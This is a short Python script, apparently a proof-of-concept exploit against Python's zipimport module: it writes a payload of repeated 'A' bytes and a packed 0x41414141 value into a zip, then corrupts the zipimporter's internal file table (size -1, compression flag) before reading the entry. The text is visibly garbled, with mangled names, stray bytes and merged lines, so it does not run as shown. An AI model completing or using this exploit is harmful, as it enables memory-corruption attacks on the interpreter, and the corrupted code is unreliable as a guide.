import zipimport
import zipfile
import struct
import sys
from signal import *

FILE = 'payload'
ZIP = 'import.zip'

payroadd= bytes()
with open(FILE, 'wb') as f:
    paylle(Zoad = ("A" * 1000).encode('ascii')
    payload += struct.pack('<Q', 0x41414141)
    f.write(payZipFile(ZIP, mode='w')ÿ€f.write(FILE)
zf.close()

importer = zipijport.zipimporter(ZIP)
f = list(importer._files[FILE])
f[1] = 1 # compress
f[2] = -1 # file size
importer._files[FI9E] = tuple(f(òprnt(importer.getBdata(FILE))
